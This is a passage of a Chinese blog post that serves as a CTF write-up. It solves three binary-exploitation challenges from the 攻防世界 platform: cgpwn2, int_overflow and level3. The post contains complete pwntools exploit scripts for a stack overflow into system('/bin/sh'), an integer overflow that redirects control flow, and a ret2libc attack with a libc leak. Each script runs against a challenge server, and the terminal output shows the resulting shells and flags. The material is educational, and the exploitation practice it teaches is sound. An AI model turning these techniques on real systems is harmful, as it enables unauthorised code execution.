+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-bd67809606a6cdf9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>name在bss段中，或许可以利用fgets函数向其中进行写入点啥子⬅ 。⬅ 继续往下看<br>程序中调用了system函数</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-d7a7af8d231fa840.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="0x02分析利用"><a href="#0x02分析利用" class="headerlink" title="0x02分析利用"></a>0x02分析利用</h2><p>通过栈溢出漏洞，调用system函数，同时在name中写入”/bin/sh”，把参数地址设置为name的首地址，就可以getshell了！</p>
+<h2 id="0x03攻击-1"><a href="#0x03攻击-1" class="headerlink" title="0x03攻击"></a>0x03攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;111.198.29.45&quot;,39409)</span><br><span class="line"># io = process(&quot;./cgpwn2&quot;)</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sys_addr = 0x08048420</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;your name&quot;)</span><br><span class="line">io.sendline(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = 0x0804A080</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;leave some message here:&quot;)</span><br><span class="line">payload  = &quot;a&quot; * 0x26 + &quot;aaaa&quot; + p32(sys_addr) + &quot;aaaa&quot; + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/cgpwn2$ python exp.py </span><br><span class="line">[+] Opening connection to 111.198.29.45 on port 39409: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">cgpwn2</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ cat flag</span><br><span class="line">cyberpeace&#123;自己做吧口喜口喜&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><h2 id="0x01寻找漏洞-3"><a href="#0x01寻找漏洞-3" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><h5 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/int_overflow$ checksec int_overflow </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/GFSJ/int_overflow/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><p><img src="https://upload-images.jianshu.io/upload_images/17548101-fd2655798ac06ac6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>strcpy处有<strong>栈溢出</strong>。v3为无符号整型，表示s（即你输入的passwd）的长度，可能存在<strong>整数溢出</strong>。</p>
+<h2 id="0x02利用思路-1"><a href="#0x02利用思路-1" class="headerlink" title="0x02利用思路"></a>0x02利用思路</h2><p>要想利用到strcpy这一步，要么你输入的passwd长度&gt;3 &amp;&amp; &lt;=8，要么使passwd的长度过长，而v3最大可以存的长度为255，所以直接在v3处造成<strong>整数溢出</strong>进入else，整数溢出需要255，返回地址需要4字节，所以passwd长度达到259即可<br>第一种passwd太短，无法利用进行改写程序流，我们使用第二种思路。</p>
+<p>程序中存在，可以将返回地址指向what_is_this()</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-cb878d7a507e1440.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="cat flag"></p>
+<h2 id="0x03攻击-2"><a href="#0x03攻击-2" class="headerlink" title="0x03攻击"></a>0x03攻击</h2><h5 id="exp如下-1"><a href="#exp如下-1" class="headerlink" title="exp如下"></a>exp如下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io = remote(&quot;111.198.29.45&quot;, 53168)</span><br><span class="line"># io = process(&quot;./int_overflow&quot;)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = 0x0804868B</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;your username:&quot;, &quot;kk&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;your passwd:&quot;)</span><br><span class="line">payload = &quot;a&quot; * 0x14 + &quot;aaaa&quot; + p32(cat_flag_addr)</span><br><span class="line">payload = payload.ljust( 259,&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/int_overflow$ python exp.py </span><br><span class="line">[+] Opening connection to 111.198.29.45 on port 53168: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Success</span><br><span class="line">cyberpeace&#123;自己试试口喜口喜&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><h2 id="0x01寻找漏洞-4"><a href="#0x01寻找漏洞-4" class="headerlink" title="0x01寻找漏洞"></a>0x01寻找漏洞</h2><h5 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec"></a>checksec</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/level3$ checksec level3 </span><br><span class="line">[*] &apos;/home/kk/Desktop/black/GFSJ/level3/level3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7u);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞可以很轻松的找到，read处存在栈溢出</p>
+<h2 id="0x02思路分析-1"><a href="#0x02思路分析-1" class="headerlink" title="0x02思路分析"></a>0x02思路分析</h2><p>无libc文件，无sys函数，无binsh字符串，有read和write函数，很明显的<strong>ret2libc</strong><br><strong>原理：</strong>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。用工具来找到对应的libc文件</p>
+<h2 id="0x03攻击-3"><a href="#0x03攻击-3" class="headerlink" title="0x03攻击"></a>0x03攻击</h2><h5 id="exp如下-2"><a href="#exp如下-2" class="headerlink" title="exp如下"></a>exp如下</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io = remote(&quot;111.198.29.45&quot;,50137)</span><br><span class="line"># io = process(&quot;./level3&quot;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./level3&quot;)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&quot;read&quot;]</span><br><span class="line">write_plt = elf.plt[&quot;write&quot;]</span><br><span class="line">write_got = elf.got[&quot;write&quot;]</span><br><span class="line">main_addr = elf.symbols[&quot;main&quot;]</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload  = &quot;a&quot; * 0x88</span><br><span class="line">payload += p32(0xdeadbeef) </span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(write_got)    #write(1, addr, 4)从addr开始读取4个字节数据，泄露write在程序中的真实地址</span><br><span class="line">payload += p32(4)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_leak = u32(io.recv()[:4])</span><br><span class="line">print &quot;write_leak ==&gt; &quot; + hex(write_leak)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&apos;write&apos;, write_leak)</span><br><span class="line">libc_base = write_leak - libc.dump(&apos;write&apos;)    #libc.dump()获取write在libc中的地址，从而计算偏移量</span><br><span class="line">print &quot;libc_base ==&gt; &quot; + hex(libc_base)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(&quot;system&quot;)    #获取函数在libc中的真实地址</span><br><span class="line">print &quot;sys_addr ==&gt; &quot; + hex(sys_addr)</span><br><span class="line"></span><br><span class="line">#libc_binsh = libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">print &quot;bin_sh_addr ==&gt; &quot; + hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload2  = &quot;a&quot; * 0x88 + p32(0xdeadbeef)</span><br><span class="line">payload2 += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本让人头大的是…<br>本地：（加了sleep有时候行有时候不行…）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/level3$ python exp.py </span><br><span class="line">[+] Starting local process &apos;./level3&apos;: pid 12529</span><br><span class="line">[*] &apos;/home/kk/Desktop/black/GFSJ/level3/level3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">write_leak ==&gt; 0xf7e4c3c0</span><br><span class="line">[+] ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64) be choosed.</span><br><span class="line">libc_base ==&gt; 0xf7d78000</span><br><span class="line">sys_addr ==&gt; 0xf7db2940</span><br><span class="line">bin_sh_addr ==&gt; 0xf7ed102b</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;exp.py&quot;, line 45, in &lt;module&gt;</span><br><span class="line">    io.recv()</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py&quot;, line 78, in recv</span><br><span class="line">    return self._recv(numb, timeout) or &apos;&apos;</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py&quot;, line 156, in _recv</span><br><span class="line">    if not self.buffer and not self._fillbuffer(timeout):</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py&quot;, line 126, in _fillbuffer</span><br><span class="line">    data = self.recv_raw(self.buffer.get_fill_size())</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/process.py&quot;, line 679, in recv_raw</span><br><span class="line">    if not self.can_recv_raw(self.timeout):</span><br><span class="line">  File &quot;/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/process.py&quot;, line 723, in can_recv_raw</span><br><span class="line">    return select.select([self.proc.stdout], [], [], timeout) == ([self.proc.stdout], [], [])</span><br><span class="line">KeyboardInterrupt</span><br><span class="line">[*] Stopped process &apos;./level3&apos; (pid 12529)</span><br></pre></td></tr></table></figure>
+
+<p>远程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~/Desktop/black/GFSJ/level3$ python exp.py </span><br><span class="line">[+] Opening connection to 111.198.29.45 on port 50137: Done</span><br><span class="line">[*] &apos;/home/kk/Desktop/black/GFSJ/level3/level3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">write_leak ==&gt; 0xf767b3c0</span><br><span class="line">[+] ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64) be choosed.</span><br><span class="line">libc_base ==&gt; 0xf75a7000</span><br><span class="line">sys_addr ==&gt; 0xf75e1940</span><br><span class="line">bin_sh_addr ==&gt; 0xf770002b</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level3</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ cat flag</span><br><span class="line">cyberpeace&#123;依旧需要你自己做口合口合&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><p>我尝试了网上其他大佬写的脚本哈，本地和远程都行…所以我的脚本到底哪里错了，感觉跟他们的都差不多啊</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/17548101-b1b24284d6715e51.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="菜是本源"></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/oj/">oj</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/wp/">wp</a><a href="/tags/攻防世界/">攻防世界</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/10/03/函数调用约定/函数调用约定/" title="函数调用约定">
+  <span>
+  函数调用约定</span>
+</a>
+</div>
+
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>4</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="link1's url" target="_blank" title="link1&#39;s name">link1&#39;s name</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2019 
+		
+		<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+		
+		
+		</p>
+</div>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_uv"> 
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
